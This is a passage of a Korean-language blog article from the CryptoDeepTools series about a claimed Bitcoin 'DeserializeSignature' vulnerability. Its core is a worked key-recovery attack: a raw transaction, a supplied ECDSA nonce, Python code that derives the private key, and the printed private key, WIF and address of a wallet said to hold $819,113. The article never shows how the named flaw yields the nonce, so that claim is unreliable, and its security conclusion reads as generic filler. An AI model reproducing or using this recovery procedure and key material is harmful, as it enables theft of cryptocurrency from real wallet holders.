<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-35-1024x292.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5244"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>Deployments ECDSA:

SecretKey = 0x2863763e8ec6bf755cc152e5080e7c74a95295f06cfbe86d9cb7c37f28f1013c

RawTX = 01000000010dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935000000008b483045022100b44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307022074e5feb333400732256fc44a681a1ba262b080a7cc5dfa11894e7ce4d9766c6f0141045cf7dd1ad49af6957415d6b76ff39cbf78f6e72f1db9199a01127687e7230f96614ff6f0184d2191fa7428872e311fe4ddf2b91f560b30fd7dc01d2118ac0b5bffffffff01d2040000000000001976a914d74b32dfa340da479ce64aaf5e326496eb3995f188ac00000000</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><code>"Deployments ECDSA"</code>비트코인 블록체인 거래의 심각한 취약성을 의미하는&nbsp;비문이 보입니다.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>SecretKey&nbsp;</code>형식의 값&nbsp;<code>HEX</code>, 이것이 우리의 비밀 키입니다&nbsp;<code>"K" (NONCE)</code>:</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code><strong>K = 0x2863763e8ec6bf755cc152e5080e7c74a95295f06cfbe86d9cb7c37f28f1013c</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><em>Python</em>&nbsp;스크립트를&nbsp;사용하여 확인해 보겠습니다.<code>point2gen.py</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>이렇게 하려면&nbsp;<a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>ECPy</strong></a>&nbsp;타원 곡선 라이브러리를 설치하십시오 .</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!pip3 install ECPy</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5247} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-36-1024x325.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5247"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>이제 비밀 키를 지정하는 스크립트를 실행해 보겠습니다&nbsp;<code>"K" (NONCE)</code>.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!python3 point2gen.py </strong>0x2863763e8ec6bf755cc152e5080e7c74a95295f06cfbe86d9cb7c37f28f1013c</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5249} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-37-1024x288.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5249"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><code><strong>(0xb44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307 , 0x3adecc9efffbb36322c8e19071e323815403be263c1e595dc26eb762982b54b0)</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>EC (secp256k1)&nbsp;</code>서명값이 있는&nbsp;지점의 좌표 확인<code>R</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>R = 0xb44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307
S = 0x74e5feb333400732256fc44a681a1ba262b080a7cc5dfa11894e7ce4d9766c6f
Z = 0xa79974cb42f82890fcebcb9865cd512a34479d91211e2ce383def10a7388cf63</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>R          =    0xb44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307
point2gen  =   (0xb44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307 , 0x3adecc9efffbb36322c8e19071e323815403be263c1e595dc26eb762982b54b0)
</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>모두 사실입니다!</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code><strong>K = 0x2863763e8ec6bf755cc152e5080e7c74a95295f06cfbe86d9cb7c37f28f1013c</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 비밀 키를 알고 있으므로 비트코인 ​​지갑의 개인 키를 얻을 수 있습니다.<code><strong><a href="https://btc1.trezor.io/address/1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk" target="_blank" rel="noreferrer noopener">1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk</a></strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><em>Python</em>&nbsp;스크립트를 사용해 보겠습니다&nbsp;.&nbsp;<code><a href="https://github.com/demining/CryptoDeepTools/blob/main/32DeserializeSignatureVulnerability/calculate.py" target="_blank" rel="noreferrer noopener">calculate.py</a></code>&gt; &gt; &gt; 개인 키 가져오기</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>코드를 열고 모든 서명 값을 추가해 보겠습니다.<code><strong>K, R, S, Z</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0x2863763e8ec6bf755cc152e5080e7c74a95295f06cfbe86d9cb7c37f28f1013c
R = 0xb44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307
S = 0x74e5feb333400732256fc44a681a1ba262b080a7cc5dfa11894e7ce4d9766c6f
Z = 0xa79974cb42f82890fcebcb9865cd512a34479d91211e2ce383def10a7388cf63


print (h((((S * K) - Z) * modinv(R,N)) % N))</strong></code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2 class="wp-block-heading">스크립트는&nbsp;<code><a href="https://github.com/demining/CryptoDeepTools/blob/main/32DeserializeSignatureVulnerability/calculate.py" target="_blank" rel="noreferrer noopener">calculate.py</a></code>다음 공식을 사용하여 개인 키를 계산합니다.</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>스크립트를 실행해 보겠습니다.</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":5251} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-38.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5251"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code><strong>PrivKey = 0506b0b7b508625dc7b0623db41206c48058ede0a9c75ff265eeb47fea29b3f0</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">비트 주소를</a></strong>&nbsp;열고&nbsp;확인해 봅시다:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>ADDR: 1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk
WIF:  5HrVy4SVvC46tsuBhMhVEGHXG4AzhxtEqi4FLbia5vAXuF5GwaX
HEX:  0506b0b7b508625dc7b0623db41206c48058ede0a9c75ff265eeb47fea29b3f0</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5165} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-11.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5165"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://www.blockchain.com/btc/address/1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk">https://www.blockchain.com/btc/address/1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading"><a href="https://github.com/demining/CryptoDeepTools/blob/main/32DeserializeSignatureVulnerability/KEYFOUND.privkey" target="_blank" rel="noreferrer noopener">개인 키를 받았습니다!</a></h1>
<!-- /wp:heading -->

<!-- wp:image {"id":5255} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-40.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5255"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5256} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-41.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5256"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://www.blockchain.com/explorer/addresses/btc/1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk">https://www.blockchain.com/explorer/addresses/btc/1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><code><strong>BALANCE: $ 819113</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">결론</h2>
<!-- /wp:heading -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>이 기사에서는 DeserializeSignature 취약점을 분석하는 데 사용되는 주요 방법과 도구에 대해 논의했습니다. 정적 및 동적 분석과 기계 학습을 사용한 퍼지 테스트를 사용하면&nbsp;<code>BitcoinChatGPT</code>소프트웨어 개발 및 운영의 다양한 단계에서 취약점을 식별하고 제거할 수 있습니다. 비트코인의 DeserializeSignature 취약점은 네트워크 보안에 심각한 위협이 됩니다. 그러나 이 분야의 활발한 연구와 개발은 보호 수준을 높일 수 있는 새로운 전망을 열어줍니다. 알고리즘 개선, 머신러닝 활용, 보안 표준 개발, 교육 프로그램을 통해 위험을 크게 줄이고 안정적인 시스템 운영을 보장할 수 있습니다. 이 연구는 빠르게 진화하는 암호화폐 공간에서 보안 시스템을 지속적으로 모니터링하고 업데이트해야 할 필요성을 강조합니다. 개발자와 사용자를 위한 권장 사항을 따르면 위험을 크게 줄이고 잠재적인 공격으로부터 자금을 보호하는 데 도움이 됩니다. 보안은 지속적인 관심과 업데이트된 지식이 필요한 지속적인 프로세스라는 점을 기억하는 것이 중요합니다. 암호화폐 보안 분야의 현재 및 미래 개발은 식별된 문제를 제거하고 새로운 위협을 예방하는 것을 목표로 하며, 이를 통해 암호화폐 시스템의 보다 안정적이고 안전한 운영을 보장할 것입니다. 얻은 결과의 중요성은 시스템의 중요한 단점을 식별하고 이를 제거하기 위한 효과적인 솔루션을 제안하는 데 있습니다. 결과를 해석하면 이 취약점을 제거하는 것이 암호화폐의 보안과 신뢰를 향상시키는 중요한 단계임을 알 수 있습니다. DeserializeSignature 프로세스는 비트코인 ​​거래의 보안을 보장하는 데 중요합니다. 이 프로세스를 부적절하게 구현하면 심각한 취약점과 공격이 발생할 수 있습니다. 서명 구성 요소의 형식과 값을 주의 깊게 확인하고, 신뢰할 수 있는 라이브러리를 사용하며, 가능한 런타임 공격에 주의하는 것이 중요합니다. 이것이 암호화폐 거래의 안정적인 보호를 보장하는 유일한 방법입니다.</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">1. 향상된 데이터 검증</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>주요 솔루션 중 하나는 역직렬화 중에 데이터 유효성 검사 프로세스를 개선하는 것입니다. 여기에는 다음이 포함됩니다.</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>데이터 형식 확인: 데이터를 처리하기 전에 데이터가 예상 형식인지 확인합니다.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>엄격한 데이터 유형 사용: 역직렬화 중 오류를 방지하기 위해 엄격한 데이터 유형을 사용합니다.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>데이터 길이 확인: 데이터 길이가 예상한 것과 같은지 확인합니다.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">2. 보안 라이브러리 사용</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>검증되고 안전한 데이터 역직렬화 라이브러리를 사용하면 취약점의 위험을 크게 줄일 수 있습니다. 이러한 라이브러리는 개발자 커뮤니티에서 철저히 테스트하고 지원해야 합니다.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">3. 다단계 인증 구현</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>다중 레벨 인증은 시스템에 대한 무단 액세스를 방지하는 데 도움이 됩니다. 여기에는 다음이 포함됩니다.</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>이중 인증(2FA): 사용자 신원에 대한 추가 확인이 필요합니다.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>다단계 인증(MFA): 보안을 강화하기 위해 여러 인증 방법을 사용합니다.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">4. 정기 보안 감사</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>정기적인 보안 감사를 수행하면 공격자가 취약점을 악용하기 전에 취약점을 식별하고 수정할 수 있습니다. 여기에는 다음이 포함됩니다.</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>침투 테스트: 공격을 시뮬레이션하여 시스템의 약점을 식별합니다.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>코드 개정: 잠재적인 취약점을 탐지하기 위해 소스 코드를 분석합니다.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">5. 업데이트 및 패치</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>소프트웨어를 정기적으로 업데이트하고 패치하는 것은 보안의 핵심 측면입니다. 여기에는 다음이 포함됩니다.</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>라이브러리 및 종속성 업데이트: 사용된 모든 라이브러리 및 종속성이 최신 버전으로 업데이트되었는지 확인하세요.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>취약점 패치: 식별된 취약점에 대한 수정 사항을 신속하게 구현합니다.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">참고자료:</h2>
<!-- /wp:heading -->

<!-- wp:list {"ordered":true} -->
<ol><!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeep.ru/doc/1-mastering-bitcoin-by-andreas-m-antonopoulos-security-and-vulnerability-review-and-analysis.pdf" target="_blank" rel="noreferrer noopener">Andreas M. Antonopoulos의</a></strong> “ 비트코인 마스터링” – 이 책은 보안과 취약성을 포함한 다양한 측면을 다루는 비트코인에 관한 가장 유명한 책 중 하나입니다.</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeep.ru/doc/2-bitcoin-and-cryptocurrency-technologies.pdf" target="_blank" rel="noreferrer noopener"></a></strong>Arvind Narayanan, Joseph Bonneau, Edward Felten, Andrew Miller 및 Steven Goldfeder의<strong><a href="https://cryptodeep.ru/doc/2-bitcoin-and-cryptocurrency-technologies.pdf" target="_blank" rel="noreferrer noopener"> "비트코인 및 암호화폐 기술" – 이 책은 보안 문제를 포함하여 비트코인 ​​및 기타 암호화폐의 기본 기술에 대한 깊은 이해를 제공합니다.</a></strong></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeep.ru/doc/3-bitcoin-developer-documentation.pdf" target="_blank" rel="noreferrer noopener">비트코인 개발자 문서</a></strong> – 비트코인 ​​개발자를 위한 공식 문서는 bitcoin.org 웹사이트에서 볼 수 있습니다. 여기에는 다양한 보안 측면과 취약점에 대한 정보가 포함되어 있습니다.</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeep.ru/doc/4-bitcoin-improvement-proposals-bips.pdf" target="_blank" rel="noreferrer noopener">비트코인 개선 제안(BIP)</a></strong> – 비트코인 ​​프로토콜의 다양한 개선 및 변경 사항을 설명하는 문서입니다. 그 중 일부는 보안 및 취약점과 관련이 있습니다. BIP 목록은 bitcoin.org에서 확인할 수 있습니다.</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeep.ru/doc/5--research-on-anonymity-and-security-of-transactions-in-the-bitcoin-network-a-fistful-of-bitcoins-characterizing-payments-among-men-with-no-names.pdf" target="_blank" rel="noreferrer noopener"></a></strong>Sarah Meiklejohn 등의<strong><a href="https://cryptodeep.ru/doc/5--research-on-anonymity-and-security-of-transactions-in-the-bitcoin-network-a-fistful-of-bitcoins-characterizing-payments-among-men-with-no-names.pdf" target="_blank" rel="noreferrer noopener"> "한 줌의 비트코인: 이름 없는 남성의 결제 특성화"</a></strong> – 이 기사에서는 비트코인 ​​네트워크 거래의 익명성과 보안을 탐구합니다.</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeep.ru/doc/6-bitcoin-a-peer-to-peer-electronic-cash-system-by-satoshi-nakamoto-original-white-paper-describing-the-concept-of-bitcoin.pdf" target="_blank" rel="noreferrer noopener">"비트코인: P2P 전자 현금 시스템"(Satoshi Nakamoto 저)</a></strong> – 비트코인의 개념을 설명하는 원본 백서. 취약점에 초점을 맞추지는 않지만, 시스템을 이해하기 위한 기본적인 문서입니다.</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeep.ru/doc/7-security-and-privacy-in-the-bitcoin-network-research-by-malte-moser.pdf" target="_blank" rel="noreferrer noopener">Malte Möser의 "비트코인의 보안 및 개인 정보 보호"</a></strong> – 비트코인 ​​네트워크의 보안 및 개인 정보 보호의 다양한 측면을 탐구하는 논문입니다.</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeep.ru/doc/8-security-issues-in-bitcoin-and-blockchain-technologies-dissertation-by-ghassan-o-karame.pdf" target="_blank" rel="noreferrer noopener">Ghassan O. Karame의 "비트코인 및 블록체인 보안"</a></strong> – 비트코인 ​​및 블록체인 기술의 보안 문제에 관한 논문.</em></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://dzen.ru/embed/vqOZbDlW4tBs?from_block=partner&amp;from=zen&amp;mute=0&amp;autoplay=0&amp;tv=0">https://dzen.ru/embed/vqOZbDlW4tBs?from_block=partner&amp;from=zen&amp;mute=0&amp;autoplay=0&amp;tv=0</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">이 자료는 BITCOIN</a>&nbsp;암호화폐 &nbsp;의&nbsp;&nbsp;&nbsp;약한&nbsp;&nbsp;<a href="https://github.com/demining/CryptoDeepTools" target="_blank" rel="noreferrer noopener">ECDSA</a>&nbsp;서명에 대해 &nbsp;데이터 및 타원 곡선 암호화&nbsp;&nbsp;<a href="https://www.youtube.com/@cryptodeeptech" target="_blank" rel="noreferrer noopener">secp256k1 의 금융 보안을 보장하기 위해&nbsp;</a><a href="https://cryptodeep.ru/" target="_blank" rel="noreferrer noopener">CRYPTO DEEP TECH</a>&nbsp;포털 용으로 제작되었습니다&nbsp;&nbsp;. 소프트웨어 제작자는 자료 사용에 대해 책임을 지지 않습니다.<a href="https://www.youtube.com/@cryptodeeptech" target="_blank" rel="noreferrer noopener"></a><a href="https://github.com/demining/CryptoDeepTools" target="_blank" rel="noreferrer noopener"></a><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener"></a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/32DeserializeSignatureVulnerability" target="_blank" rel="noreferrer noopener">원천</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://colab.research.google.com/drive/1EiIIJh8UCOZZ8DVbelxhESFPvqu_xZUo" target="_blank" rel="noreferrer noopener">구글 코랩</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://attacksafe.ru/ultra" target="_blank" rel="noreferrer noopener">공격안전 울트라</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">텔레그램: https://t.me/cryptodeeptech</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://youtu.be/8E2KJeWu4XA" target="_blank" rel="noreferrer noopener">영상자료 : https://youtu.be/8E2KJeWu4XA</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://dzen.ru/video/watch/664e34fc8df6514b10da09e9" target="_blank" rel="noreferrer noopener">Dzen 비디오 튜토리얼: https://dzen.ru/video/watch/664e34fc8df6514b10da09e9</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptodeep.ru/deserialize-signature-vulnerability-bitcoin" target="_blank" rel="noreferrer noopener">출처: https://cryptodeep.ru/deserialize-signature-vulnerability-bitcoin</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":5187} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/053-1-1024x576.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5187"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>&nbsp;<a href="https://cryptodeep.ru/category/%d0%ba%d1%80%d0%b8%d0%bf%d1%82%d0%be%d0%b0%d0%bd%d0%b0%d0%bb%d0%b8%d0%b7/">암호분석</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->
